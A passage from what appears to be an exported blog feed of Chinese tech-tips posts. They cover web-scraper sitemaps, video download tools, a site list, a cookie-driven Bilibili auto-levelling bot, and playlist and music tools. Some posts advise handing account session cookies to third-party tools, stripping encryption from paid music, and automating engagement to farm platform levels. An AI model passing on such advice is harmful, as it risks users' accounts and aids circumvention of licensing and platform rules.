a","multiple":false,"regex":"","delay":0&#125;,&#123;"id":"赞同数","type":"SelectorText","parentSelectors":["回答容器"],"selector":"button.VoteButton--up","multiple":false,"regex":"","delay":0&#125;,&#123;"id":"阅读全文","type":"SelectorElementClick","parentSelectors":["回答容器"],"selector":"button.ContentItem-more","multiple":true,"delay":2000,"clickElementSelector":"button.ContentItem-more","clickType":"clickOnce","discardInitialElements":"do-not-discard","clickElementUniquenessType":"uniqueText"&#125;,&#123;"id":"回答内容","type":"SelectorText","parentSelectors":["回答容器"],"selector":"div.RichContent-inner","multiple":false,"regex":"","delay":0&#125;,&#123;"id":"回答链接","type":"SelectorElementAttribute","parentSelectors":["回答容器"],"selector":"[itemprop='zhihu:question'] a","multiple":false,"extractAttribute":"href","delay":0&#125;]&#125; 知乎专栏文章这里以另一面专栏为例 https://zhuanlan.zhihu.com/Wisdom ，由于文章是滚动式加载，因此增加type Element scroll down里面有5个选择器：文章标题，阅读全文，文章内容，文章链接，文章赞数。抓取后页面会自动滚动加载，并且点击阅读全文展开内容。为了方便大家学习抓取，我导出了sitemap，你可以直接导入使用，如果还想导出文章转PDF可以参考这个Python脚本 https://gitee.com/crossin/snippet/blob/master/get_zhihu/get_zhihu.py 。1&#123;"_id":"zhihu_zhuanlan","startUrl":["https://zhuanlan.zhihu.com/Wisdom"],"selectors":[&#123;"id":"文章容器","type":"SelectorElementScroll","parentSelectors":["_root"],"selector":"div.css-8txec3","multiple":true,"delay":2000&#125;,&#123;"id":"文章标题","type":"SelectorText","parentSelectors":["文章容器"],"selector":".ContentItem-title a","multiple":false,"regex":"","delay":0&#125;,&#123;"id":"阅读全文","type":"SelectorElementClick","parentSelectors":["文章容器"],"selector":"button.ContentItem-more","multiple":true,"delay":2000,"clickElementSelector":"button.ContentItem-more","clickType":"clickOnce","discardInitialElements":"do-not-discard","clickElementUniquenessType":"uniqueHTMLText"&#125;,&#123;"id":"文章内容","type":"SelectorText","parentSelectors":["文章容器"],"selector":"div.RichContent-inner","multiple":false,"regex":"","delay":0&#125;,&#123;"id":"文章链接","type":"SelectorElementAttribute","parentSelectors":["文章容器"],"selector":".ContentItem-title a","multiple":false,"extractAttribute":"href","delay":0&#125;,&#123;"id":"文章赞数","type":"SelectorText","parentSelectors":["文章容器"],"selector":"button.VoteButton--up","multiple":false,"regex":"","delay":0&#125;]&#125; 知乎话题这里以电影话题为例 https://www.zhihu.com/topic/19550429/top-answers ，由于这个话题下回答太多，我们只取前50条，因此在元素后增加-n+50 nth-of-type(-n+50) ，同样是滚动加载 Element scroll down 。 里面有3个选择器 ：知乎问题，回答人，赞同数 。 需要注意title 不能直接用[itemprop=&#39;zhihu:question&#39;] a ，有些标题没有这个类，可以点击两次 P 键，匹配到标题的父标签 h2 或者 h2.ContentItem-title。看下抓取结果没问题。为了方便大家学习抓取，我导出了sitemap，你可以直接导入使用。1&#123;"_id":"zhihu_topic","startUrl":["https://www.zhihu.com/topic/19550429/top-answers"],"selectors":[&#123;"id":"topic","type":"SelectorElementScroll","parentSelectors":["_root"],"selector":"div.List-item:nth-of-type(-n+100)","multiple":true,"delay":2000&#125;,&#123;"id":"知乎问题","type":"SelectorText","parentSelectors":["topic"],"selector":"h2","multiple":false,"regex":"","delay":0&#125;,&#123;"id":"回答人","type":"SelectorText","parentSelectors":["topic"],"selector":".AuthorInfo-name div.Popover","multiple":false,"regex":"","delay":0&#125;,&#123;"id":"赞同数","type":"SelectorText","parentSelectors":["topic"],"selector":"button.VoteButton--up","multiple":false,"regex":"","delay":0&#125;]&#125; 微博转发这里以李健的这条微博转发为例 https://weibo.com/1744395855/JpvzPo9Rx?type=repost ，翻页的type为 element click ，这种翻页页面不会刷新。 里面有3个选择器：微博昵称，微博评论，评论时间。看下抓取结果没问题。 为了方便大家学习抓取，我导出了sitemap，你可以直接导入使用。1&#123;"_id":"weibo","startUrl":["https://weibo.com/1744395855/JpvzPo9Rx?type=repost"],"selectors":[&#123;"id":"content","type":"SelectorElementClick","parentSelectors":["_root"],"selector":"div.list_li","multiple":true,"delay":2000,"clickElementSelector":"a.page[action-data]","clickType":"clickOnce","discardInitialElements":"do-not-discard","clickElementUniquenessType":"uniqueText"&#125;,&#123;"id":"微博昵称","type":"SelectorText","parentSelectors":["content"],"selector":".WB_text a[usercard]","multiple":false,"regex":"","delay":0&#125;,&#123;"id":"微博评论","type":"SelectorText","parentSelectors":["content"],"selector":".WB_text span","multiple":false,"regex":"","delay":0&#125;,&#123;"id":"评论时间","type":"SelectorText","parentSelectors":["content"],"selector":".WB_from a","multiple":false,"regex":"","delay":0&#125;]&#125; 豆瓣电影之前文章抓取豆瓣电影是通过URL分页来抓取 https://movie.douban.com/top250?start=[0-250:25]&amp;filter= ，这里通过点击下一页来抓取，新增type 为 link ，它有两个父节点：_root 和自己（按 shift 可以多选）。结构图如下：电影元素里有5个选择器：电影名称，电影排名，电影简介，豆瓣评分，豆瓣链接。抓取结果也很完美。 为了方便大家学习抓取，我导出了sitemap，你可以直接导入使用。1&#123;"_id":"douban_movies","startUrl":["https://movie.douban.com/top250?start=0&amp;filter="],"selectors":[&#123;"id":"下一页","type":"SelectorLink","parentSelectors":["_root","下一页"],"selector":".next a","multiple":true,"delay":0&#125;,&#123;"id":"电影元素","type":"SelectorElement","parentSelectors":["_root","下一页"],"selector":".grid_view li","multiple":true,"delay":0&#125;,&#123;"id":"电影名称","type":"SelectorText","parentSelectors":["电影元素"],"selector":"span.title:nth-of-type(1)","multiple":false,"regex":"","delay":0&#125;,&#123;"id":"电影排名","type":"SelectorText","parentSelectors":["电影元素"],"selector":"em","multiple":false,"regex":"","delay":0&#125;,&#123;"id":"电影简介","type":"SelectorText","parentSelectors":["电影元素"],"selector":"span.inq","multiple":false,"regex":"","delay":0&#125;,&#123;"id":"豆瓣评分","type":"SelectorText","parentSelectors":["电影元素"],"selector":"span.rating_num","multiple":false,"regex":"","delay":0&#125;,&#123;"id":"豆瓣链接","type":"SelectorElementAttribute","parentSelectors":["电影元素"],"selector":"div.hd a","multiple":false,"extractAttribute":"href","delay":0&#125;]&#125; 通过这次新增的几个type ：Element attribute ， element click ，Element scroll down， link，以及 nth-of-type(-n+50) 应该可以完成大部分网站的数据抓取。 最近文章： 视频下载神器：支持腾讯/优酷/爱奇艺/b站/微博等全网视频 良心整理：PDF工具合集 2020 最全电子书搜索网站，找电子书不再愁 b 站账号快速升级到 Lv6：每天自动签到，观看，分享，投币视频 集赞生成器：朋友圈集赞不求人 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[视频下载神器：支持腾讯/优酷/爱奇艺/b站/微博等全网视频]]></title>
    <url>%2F2020%2F11%2F20%2F%E8%A7%86%E9%A2%91%E4%B8%8B%E8%BD%BD%E7%A5%9E%E5%99%A8%EF%BC%9A%E6%94%AF%E6%8C%81%E8%85%BE%E8%AE%AF-%E4%BC%98%E9%85%B7-%E7%88%B1%E5%A5%87%E8%89%BA-b%E7%AB%99-%E5%BE%AE%E5%8D%9A%E7%AD%89%E5%85%A8%E7%BD%91%E8%A7%86%E9%A2%91%2F</url>
    <content type="text"><![CDATA[苏生不惑第194 篇原创文章，将本公众号设为星标，第一时间看最新文章。 虽然大部分视频网站都提供视频下载/缓存功能，但有些下载的视频只能用指定播放器来播放，而且为了下载视频都要安装他们的工具太麻烦了，如果有一个通用下载工具就方便了，这里推荐几个视频下载神器，支持腾讯/优酷/爱奇艺/b站/微博等全网视频。 命令行下载工具命令行下载工具有 youtube-dl，you-get ，ykdl ，annie 4个。 youtube-dl 是一款基于Python的网络视频命令行下载工具 https://github.com/ytdl-org/youtube-dl ，最初旨在从Youtube上下载视频，现在也支持其它网站了，先安装好Python再命令行中用pip install -U youtube-dl来安装它 ，我用的命令行工具是cmder。 123456789λ pip install -U youtube-dlCollecting youtube-dl Downloading https://files.pythonhosted.org/packages/89/5e/78523cb106c93370941b5fdd7e6dab58d66d762a1d7fd914eeff8ba2fb03/youtube_dl-2020.11.1.1-py2.py3-none-any.whl (1.8MB) |████████████████████████████████| 1.8MB 1.3MB/sInstalling collected packages: youtube-dl Found existing installation: youtube-dl 2018.10.5 Uninstalling youtube-dl-2018.10.5: Successfully uninstalled youtube-dl-2018.10.5Successfully installed youtube-dl-2020.11.1.1 前段时间由于某些原因被下架了，于是有了镜像工具 youtube-dlc https://github.com/blackjack4494/yt-dlc ，还好现在恢复了。123456789101112λ pip install --upgrade youtube-dlcCollecting youtube-dlc Downloading https://files.pythonhosted.org/packages/3c/a7/6b6b681766b3786273f0c52f34fb2537c0eae51d817476a7bee18d0f3bc4/youtube_dlc-2020.11.7-py2.py3-none-any.whl (1.8MB) |████████████████████████████████| 1.8MB 364kB/sInstalling collected packages: youtube-dlcSuccessfully installed youtube-dlc-2020.11.7λ youtube-dlc https://www.bilibili.com/video/BV1dD4y197fH[BiliBili] 1dD4y197fH: Downloading webpage[BiliBili] 1dD4y197fH: Downloading video info page[download] Destination: 活动作品十一月听什么？当然是《十一月的嚣张》！-1dD4y197fH.flv[download] 100% of 171.93MiB in 03:36 youtube-dlc https://www.bilibili.com/video/BV1dD4y197fH很快就下载好了一个b站视频 。用QQ影音播放器就能播放。you-get 也是基于Python的命令行工具 https://github.com/soimort/you-get ，直接使用 pip install you-get 来安装。 使用 you-get --format=flv360 https://www.bilibili.com/video/BV1dD4y197fH下载 360p格式的视频。1234567891011121314λ you-get --format=flv360 https://www.bilibili.com/video/BV1dD4y197fHsite: Bilibilititle: 十一月听什么？当然是《十一月的嚣张》！stream: - format: flv360 container: flv quality: 流畅 360P size: 27.4 MiB (28742996 bytes) # download-with: you-get --format=flv360 [URL]Downloading 十一月听什么？当然是《十一月的嚣张》！.flv ... 100% ( 27.4/ 27.4MB) ├████████████████████████████████████████┤[1/1] 166 kB/sDownloading 十一月听什么？当然是《十一月的嚣张》！.cmt.xml ... 连弹幕也下载好了，可以用文本编辑器打开。 ykdl是基于you-get的命令行下载工具，支持Python2和更多国内视频网站 https://github.com/zhangn1985/ykdl， 使用pip install ykdl安装它。使用ykdl --format=SD https://www.bilibili.com/video/BV1dD4y197fH 下载360p格式视频。 123456789101112λ ykdl --format=SD https://www.bilibili.com/video/BV1dD4y197fHsite: 哔哩哔哩 (Bilibili)title: 十一月听什么？当然是《十一月的嚣张》！ - 十一月的肖邦十五周年-muxedartist: zyl2012streams: - format: SD container: mp4 video-profile: 流畅 360P size: 27.4 MiB (28742996 bytes) # download-with: ykdl --format=SD [URL]Download: 十一月听什么？当然是《十一月的嚣张》！ - 十一月的肖邦十五周年-muxed_SD 100% 最后一个是 annie https://github.com/iawia002/annie ，它是基于golang开发的命令行工具，使用 go get github.com/iawia002/annie 来安装它，如果没有go环境可以下载提供的可执行文件 https://wwx.lanzoux.com/iIB1Rgf90uf ，然后配置下环境变量。它支持的视频网站有抖音，b站，优酷，YouTube，爱奇艺，芒果，微博，腾讯视频，网易云音乐，好看视频等。 annie -i https://v.youku.com/v_show/id_XMjg5MDQxOTc2MA==.html查看优酷视频信息。123456789101112131415annie -i https://v.youku.com/v_show/id_XMjg5MDQxOTc2MA==.html Site: 优酷 youku.com Title: 周杰伦电影《不能说的秘密》你看过吗? 是杰迷都会唱这首歌吧 Type: video Streams: # All available quality [flvhd] ------------------- Quality: flvhd 640x360 Size: 9.24 MiB (9693070 Bytes) # download with: annie -f flvhd ... [3gphd] ------------------- Quality: 3gphd 480x268 Size: 6.93 MiB (7268066 Bytes) # download with: annie -f 3gphd ... annie -i https://www.iqiyi.com/w_19rwc42eht.html查看爱奇艺视频信息。 12345678910111213141516171819202122232425annie -i https://www.iqiyi.com/w_19rwc42eht.htmlSite: 爱奇艺 iqiyi.comTitle: 几分钟看完周杰伦巅峰爱情电影《不能说的秘密》-电影-完整版视频在线观看-爱奇艺Type: videoStreams: # All available quality [5] ------------------- Quality: 1920x1080 Size: 35.51 MiB (37234397 Bytes) # download with: annie -f 5 ... [4] ------------------- Quality: 1920x1080 Size: 24.04 MiB (25207170 Bytes) # download with: annie -f 4 ... [2] ------------------- Quality: 1920x1080 Size: 16.17 MiB (16958163 Bytes) # download with: annie -f 2 ... [1] ------------------- Quality: 1920x1080 Size: 8.30 MiB (8704998 Bytes) # download with: annie -f 1 ... annie -i https://v.qq.com/x/cover/mzc00200vvfld1j/q0034sb9eru.html查看腾讯视频信息。12345678910111213141516171819202122232425annie -i https://v.qq.com/x/cover/mzc00200vvfld1j/q0034sb9eru.htmlSite: 腾讯视频 v.qq.comTitle: 周杰伦《Mojito》MV首播，一起恋上古巴的微醺浪漫Type: videoStreams: # All available quality [fhd] ------------------- Quality: 蓝光;(1080P) Size: 66.57 MiB (69801700 Bytes) # download with: annie -f fhd ... [shd] ------------------- Quality: 超清;(720P) Size: 43.26 MiB (45358921 Bytes) # download with: annie -f shd ... [hd] ------------------- Quality: 高清;(480P) Size: 20.86 MiB (21873015 Bytes) # download with: annie -f hd ... [sd] ------------------- Quality: 标清;(270P) Size: 9.11 MiB (9554586 Bytes) # download with: annie -f sd ... annie -i https://www.bilibili.com/video/BV1dD4y197fH 查看b站视频信息，其余视频网站就不一一演示了。123456789101112131415161718192021222324252627282930313233343536373839404142annie -i https://www.bilibili.com/video/BV1dD4y197fH Site: 哔哩哔哩 bilibili.com Title: 活动作品十一月听什么？当然是《十一月的嚣张》！ Type: video Streams: # All available quality [80] ------------------- Quality: 高清 1080P Size: 159.23 MiB (166964530 Bytes) # download with: annie -f 80 ... [64] ------------------- Quality: 高清 720P Size: 109.15 MiB (114453468 Bytes) # download with: annie -f 64 ... [32] ------------------- Quality: 清晰 480P Size: 54.01 MiB (56629359 Bytes) # download with: annie -f 32 ... [16] ------------------- Quality: 流畅 360P Size: 22.41 MiB (23495541 Bytes) # download with: annie -f 16 ...``` ![image.png](https://upload-images.jianshu.io/upload_images/23152173-114bbd516d0eac87.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)使用 ` annie -f 16 https://www.bilibili.com/video/BV1dD4y197fH` 下载b站视频，如果需要登录账号权限下载可以加入cookie下载 `annie -c cookies.txt https://www.bilibili.com/video/BV1dD4y197fH` 。```js annie -f 16 https://www.bilibili.com/video/BV1dD4y197fH Site: 哔哩哔哩 bilibili.com Title: 活动作品十一月听什么？当然是《十一月的嚣张》！ Type: video Stream: [16] ------------------- Quality: 流畅 360P Size: 22.41 MiB (23495541 Bytes) # download with: annie -f 16 ... 22.41 MiB / 22.41 MiB [==================================================================] 100.00% 5.21 MiB/s 4s Merging video parts into 活动作品十一月听什么？当然是《十一月的嚣张》！.mp4 上面4个命令行工具也不用都下载，有人开发了集合 annie/ykdl/youtube-dl/you-get 的组件 AYY-VideoDown 。 AYY-VideoDown 这个工具集合了 annie/ykdl/youtube-dl/you-get 四大网络视频下载工具（公众号后台回复 视频 获取），其中annie 默认安装了可以直接使用，其余3个自行选择安装。 如果不会用命令行下载还有基于you-get的界面版软件vdl。 vdl vdl是基于you-get的界面版软件， 比如下载腾讯视频周杰伦的《Mojito》 https://v.qq.com/x/cover/mzc00200vvfld1j/q0034sb9eru.html 下载爱奇艺视频 https://www.iqiyi.com/w_19rwc42eht.html b站视频地址可以选择分p下载。 对于不在上面命令行工具支持列表的网站可以使用 idm和 m3u8 工具来下载，比如知乎视频就可以idm直接下载。 m3u8格式的视频就不能用idm了，推荐这个工具 https://github.com/nilaoda/N_m3u8DL-CLI https://wwx.lanzoux.com/ifAYJiitxve 比如获取腾讯视频 https://v.qq.com/x/cover/mzc00200vvfld1j/q0034sb9eru.html 的 m3u8地址 https://defaultts.tc.qq.com/defaultts.tc.qq.com/AKXSNi8x6hxiqLy-vm5AhWV9dq_L7hIdRXtTnmcYBkxY/uwMROfz2r5zCIaQXGdGnC2df644Q3LWUuLvyGY4RMhgE_3T2/-rp2e6W0VzJkbiX70R_4tK0WBrq2oF8s0TX0tN7CiYWIdFMYUuoiAmTSKC-jJIFoIORa7HycZryWuVHPDq4OnGJezgtfLIq1e54A2xTzpMqrqV0r0P1Xv_MtU2uqIye8MNTKoggXqUhNZkQlCt0I8a93zk9QUHGLe1x1BqGapxY/q0034sb9eru.321002.ts.m3u8?ver=4输入获取的m3u8地址直接下载。 很快下载好了。 另外如果想批量下载b站up主视频推荐这个 b站下载工具 ，之前文章 如何更优雅地使用 bilibili(b站) 介绍过，比如输入李永乐老师https://space.bilibili.com/9458053/ 的uid，共352个视频。下载速度还是很快的。还有下载抖音博主的视频 https://v.douyin.com/JkaaoTH/ ，之前文章一键批量下载抖音无水印视频 也介绍过了。 如果要下载MOOC大学的视频见之前文章一键下载中国大学/网易云课堂/慕课网等课程视频和课件 最后分享个油猴脚本（公众号后台回复 视频 获取），可以去除腾讯，优酷，爱奇艺视频上的logo图标，之前文章 如何更优雅地看电影/刷剧 也介绍过，谷歌浏览器安装油猴Chrome扩展 https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo?hl=zh-CN 后直接导入脚本文件。 安装脚本前。安装脚本后爱奇艺logo不见了。 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些有趣的网站系列（七）]]></title>
    <url>%2F2020%2F11%2F20%2F%E9%82%A3%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BD%91%E7%AB%99%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%83%EF%BC%89%2F</url>
    <content type="text"><![CDATA[苏生不惑第193篇原创文章，将本公众号设为星标，第一时间看最新文章。 之前分享过有趣的网站有： 那些有趣的网站 那些有趣的网站（二） 那些有趣的网站系列（三） 那些有趣的网站系列（四） 那些有趣的网站系列（五） 那些有趣的网站系列（六） 这是系列第7篇。 世界语言发音https://zh.forvo.com/ 这个网站可以交流世界上各种语言的发音，问某个词怎么发音，而且还有各种方言，沪语粤语胶辽官话，比如听听各地方言怎么说吃饭这个词的。 押韵精灵 http://www.cnh5.net/ 在线押韵工具,支持单双三四押,大幅提高文案、诗词、金句、Rap创作效率的押韵神器。测试下效果类似的网站有押韵助手https://yayun.la/ ，如果想查古诗词可以看看这些网站 https://www.xungushici.com/ ,https://www.gushiwen.org/ ,https://meirishici.com/ , http://bsw.unclear.top/, https://1saying.com/ 微博历史热搜https://weibo.zhaoyizhe.com/ ，可以根据日期搜索当天的微博热搜。 ps:微博发布了新版，如果不想开会员使用可以访问接口https://weibo.com/ajax/changeversion?status=7 ，想回退访问https://weibo.com/ajax/changeversion?status=6 另外还有个github项目会自动记录知乎每天的热榜数据 https://github.com/crosslife/ZhihuHot 日历计划表https://www.calendarpedia.com/ 自己动手做年历、月历、周历或日历计划表，日历款式Word、Excel和 Pdf 三种文件格式可供选择，还有横版和竖版，可以免费下载和打印。 淘宝评论生成器https://haoduck.com/demo/tbpl.html ，比如生成关于电脑的淘宝评论 。 emoji大全https://emojidaquan.com/ 一个搜集和整理emoji的网站，可以快速、方便地查找、复制各大平台的emoji表情，同时还可以查看emoji表情的定义、使用方法、使用平台以及一些有趣的玩法。类似的还有https://emojiwiz.com/zh/ ，https://emoji.ohou.ga/ 文件分享https://airsend.cn/ 一个基于 P2P 的文件分享服务 ，允许你在不同网络中的设备之间共享文件。 生活指南https://zh.wikihow.com/ 一个人人可编辑、教大家做任何事情的百科全书，网站上几乎全是“如何xxx ”的内容，包含生活、工作、金融、技能、旅行、宗教等。 照片合成https://photofunia.com/ 把照片 P 在任何场景中，包括海报、墙体广告等，比如把桂纶镁嵌入到书里 https://photofunia.com/results/5fa7fba8fe31e245438b4589 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[b 站账号快速升级到 Lv6：每天自动签到，观看，分享，投币视频]]></title>
    <url>%2F2020%2F11%2F20%2Fb-%E7%AB%99%E8%B4%A6%E5%8F%B7%E5%BF%AB%E9%80%9F%E5%8D%87%E7%BA%A7%E5%88%B0-Lv6%EF%BC%9A%E6%AF%8F%E5%A4%A9%E8%87%AA%E5%8A%A8%E7%AD%BE%E5%88%B0%EF%BC%8C%E8%A7%82%E7%9C%8B%EF%BC%8C%E5%88%86%E4%BA%AB%EF%BC%8C%E6%8A%95%E5%B8%81%E8%A7%86%E9%A2%91%2F</url>
    <content type="text"><![CDATA[苏生不惑第192 篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于b站之前写了8篇文章，有兴趣回顾下： bilibili(b站)升级到BV号了，还想用av号怎么办？ 那些你可能不知道的 bilibili 奇技淫巧 如何轻松下载腾讯/微博/优酷/爱奇艺/b站等全网视频？ 如何更优雅地使用 bilibili(b站) 如何找回bilibili(b站)收藏夹里失效的视频？ 如何免登陆观看b站大会员番剧 借助 potplayer 播放器，在本地播放 b 站视频也能看弹幕了 下载b站外挂字幕,用 potplayer 播放视频也能看字幕了 今天分享的是每天自动签到，观看，分享，投币视频刷经验值，让你的b站账号快速升级到 Lv6 ，先来b站个人中心看看效果。每天定时发微信提醒。 下面说下如何操作的，分为 GitHub actions 自动刷和手动刷。 获取b站cookie 谷歌浏览器登录b站 https://www.bilibili.com/ ，打开控制台找到Application下的Cookies 。 我们需要bili_jct,SESSDATA,DEDEUSERID这三项，然后fork 这个GitHub项目 https://github.com/RayWangQvQ/BiliBiliTool 。 GitHub Secrets打开 GitHub actions 新建3个secrets 变量 USERID，SESSDATA，BILIJCT ，值就是上面的cookie值。 接着开启 workflow 。执行 workflow 测试下。执行成功。看下执行结果日志。123456789101112131415161718192021222324[18:50:58 INF] -----开始每日任务-----[18:50:58 INF] ---开始【登录】---[18:50:59 INF] 登录成功，用户名: 苏**惑[18:50:59 INF] 硬币余额: 339[18:50:59 INF] 距离升级到Lv4还有: 4天[18:50:59 INF] ---【登录】结束---[18:50:59 INF] ---开始【观看、分享视频】---[18:50:59 INF] 今天已经观看过了，不需要再看啦[18:50:59 INF] 今天已经分享过了，不要再分享啦[18:50:59 INF] ---【观看、分享视频】结束---[18:50:59 INF] ---开始【投币】---[18:51:00 INF] 今日已投5枚硬币，目标是投5枚硬币[18:51:00 INF] 已完成投币任务，今天不需要再投啦[18:51:00 INF] ---【投币】结束---[18:51:00 INF] ---开始【漫画签到】---[18:51:03 INF] 今日已签到过，无法重复签到[18:51:03 INF] ---【漫画签到】结束---[18:51:03 INF] ---开始【直播中心签到】---[18:51:04 INF] 直播签到成功，本次签到获得3000点用户经验,2根辣条,再签到4天可以获得666银瓜子[18:51:04 INF] ---【直播中心签到】结束--- 然后加个微信通知 ，这样方便微信看每天执行的结果，新建个secrets OTHERCONFIGS ，值为 http://sc.ftqq.com/3.version 生成的秘钥 ，再次测试下，微信收到通知。点击查看详情，跟上面看的日志一样。 整体测试下来没问题，再加个定时执行任务，这样就不用管了，每天自动刷经验值， 打开文件 .github/workflows/bilibili-daily-task.yml 修改定时时间，我这里改为每天8点20（需要注意这个是UTC时间，跟北京时间差8小时），也是我发文章的时间。 如果你没有GitHub账号，或者对这个不熟悉也可以下载软件在本地运行刷经验值。 本地运行先下载软件（由于国外网站比较慢，我已经下载好了 ，公众号后台回复 b站 获取软件），然后修改配置文件 appsettings.json 的cookie值。12345"BiliBiliCookie": &#123; "UserId": "xxx", "SessData": "xxx", "BiliJct": "xxx" &#125;, Windows下直接运行 Ray.BiliBiliTool.Console.exe ，我的账号距离升级到Lv4还有4天了。如果需要修改每日投币数量，投币时是否同时点赞，优先选择支持的up主，每月几号自动充电，每月几号自动领取会员权益可以参考 https://github.com/RayWangQvQ/BiliBiliTool.Docs/blob/main/configuration.md 添加secrets 即可。 最后提示下，由于cookie有个有效期，如果过期了需要手动更改下，还有这个跟刷网易云音乐那个不一样 每天自动打卡听歌300首 ，不支持多账号，我就没法帮你刷了。 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[歌单助手：一键导出网易云音乐歌单列表，推荐你喜爱的专辑]]></title>
    <url>%2F2020%2F11%2F20%2F%E6%AD%8C%E5%8D%95%E5%8A%A9%E6%89%8B%EF%BC%9A%E4%B8%80%E9%94%AE%E5%AF%BC%E5%87%BA%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90%E6%AD%8C%E5%8D%95%E5%88%97%E8%A1%A8%EF%BC%8C%E6%8E%A8%E8%8D%90%E4%BD%A0%E5%96%9C%E7%88%B1%E7%9A%84%E4%B8%93%E8%BE%91%2F</url>
    <content type="text"><![CDATA[苏生不惑第191 篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于网易云音乐之前写过很多文章了，有兴趣可以点击阅读： 那些你可能不知道的网易云音乐奇技淫巧 不想下载那么多音乐软件？全网音乐在线听和下载 如何轻松下载腾讯/微博/优酷/爱奇艺/b站等全网视频？ 网易云音乐等级快速升级：每天自动打卡听歌300首 一键解锁网易云音乐变灰歌曲 文章开始前说下，昨天的抽奖还在进行，有兴趣可以去抽个奖，祝你好运 周末发个红包抽奖福利 不知道网易云音乐的热门推荐是根据什么来做的，感觉跟我的听歌调性不大符合。最近发现个软件歌单助手，可以对多个平台（目前有网易云音乐和虾米音乐）的歌单进行备份导出、分析都自己听过些啥，热爱什么艺术家，给你推荐可能感兴趣的音乐专辑，我感觉还是挺搭调的。 歌单助手首先从官网 https://music.wechatsync.com/ 下载最新版安装到本地，同时还要下载网易云音乐或者虾米客户端。 网易云音乐会在 C:\Users\xxx\AppData\Local\Netease\CloudMusic\Library 生成webdb.dat文件，这个工具就是从这个文件里读取数据的，这个文件可以用sqlite打开 。12345678sqlite3sqlite&gt; .open webdb.datsqlite&gt; .databasemain: d:\download\webdb.datsqlite&gt; .tablesweb_cloud_track web_offline_track web_playlist_order web_trackweb_map web_playlist web_playlist_track web_user_playlistsqlite&gt; select * from web_track; 我的歌单里只有2首周杰伦的。 启动软件后点击导入。 发现2首歌。 成功导入。你可以将歌单导出到Excel文件。 目前没有删除机制，如果删除歌单可以手动删除文件 C:\Users\xxx\allmusic.db 重启后导入就正常了。 点击发现音乐或者安装Chrome插件使用网页版 https://music.wechatsync.com/explore/ ，基于近期的收藏列表推荐的都是周杰伦专辑 。 之前分享过音乐下载工具不想下载那么多音乐软件？全网音乐在线听和下载 ，最近又发现几个，也推荐下。 音乐下载工具52小菜鸟，支持多平台vip音乐查询下载（公众号后台回复 音乐 获取软件） https://wwx.lanzoux.com/ifSzfhtkned 酷我音乐解析器，可在线播放下载 https://wwx.lanzoux.com/iu7uYhtkyhc 如果你是在网易云音乐或QQ音乐上下载的歌曲，由于被加密了无法用普通播放器打开，推荐音乐解锁神器Unlock music https://ix64.github.io/unlock-music/ ，http://tool.moresound.tk/ ，可以轻松移除 QQ 音乐、网易云音乐等音乐软件的加密付费音乐，目前支持文件格式有网易云音乐(ncm), QQ音乐(qmc, mflac, mgg), 酷狗音乐(kgm), 虾米音乐(xm), 酷我音乐(.kwm) 。也可以使用客户端软件转换。 最后分享个网站 https://music.sl1673495.now.sh/#/discovery，它把网易云 mac 客户端搬到网页上 。 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[不会 Python 没关系，手把手教你用 web scraper 抓取豆瓣电影 top 250 和 b 站排行榜]]></title>
    <url>%2F2020%2F11%2F06%2F%E4%B8%8D%E4%BC%9A-Python-%E6%B2%A1%E5%85%B3%E7%B3%BB%EF%BC%8C%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E4%BD%A0%E7%94%A8-web-scraper-%E6%8A%93%E5%8F%96%E8%B1%86%E7%93%A3%E7%94%B5%E5%BD%B1-top-250-%E5%92%8C-b-%E7%AB%99%E6%8E%92%E8%A1%8C%E6%A6%9C%2F</url>
    <content type="text"><![CDATA[苏生不惑第190 篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于Python之前分享过很多文章了： Python 抓取知乎电影话题下万千网友推荐的电影，这个国庆节不愁没电影看了 王菲k歌又上微博热搜，Python分析下微博网友评论 如何批量下载知乎回答图片 如何发一条九宫格图片的朋友圈 一键批量下载抖音无水印视频 一键下载公众号所有文章，导出文件支持PDF，HTML，Markdown，Excel，chm等格式 七夕又来了，给女朋友做个动态二维码 一键备份微博并导出生成PDF，顺便用Python分析微博账号数据 如果要抓取数据，一般使用Python是很方便的，不过如果你还不会推荐使用Chrome扩展 web scraper，下面就分别用Python和 web scraper 抓取豆瓣电影top 250 和b站排行榜的数据。 Python 抓取豆瓣电影打开豆瓣电影top 250 主页 https://movie.douban.com/top250 我们需要抓取电影标题，排行，评分，和简介，python 抓取数据的步骤一般为请求网页，解析网页，提取数据和保存数据，下面是一段简单的Python代码。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import requestsimport reimport osfrom hashlib import md5from requests.exceptions import RequestExceptionimport bs4from requests import RequestExceptionfrom selenium import webdriverimport timefrom matplotlib import pyplot as pltimport refrom wordcloud import WordCloudimport jiebaimport pandas as pddef request_url(url): headers = &#123; 'Referer': 'https://movie.douban.com', 'Host': 'movie.douban.com', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36' &#125; response = requests.get(url, headers=headers) return response.textdef movie_info(html): data = [] soup = bs4.BeautifulSoup(html, 'html.parser') items = soup.select('li &gt; div.item') for item in items: desc_item = item.select('div.info &gt; div.bd &gt; p.quote &gt; span') desc = '' if desc_item is not None and len(desc_item) &gt; 0: desc = desc_item[0].text data.append(&#123; 'url':item.select('div.info &gt; div.hd &gt; a')[0]['href'], 'title':item.select('div.info &gt; div.hd &gt; a &gt; span')[0].text, 'rank':item.select('div.pic &gt; em')[0].text, 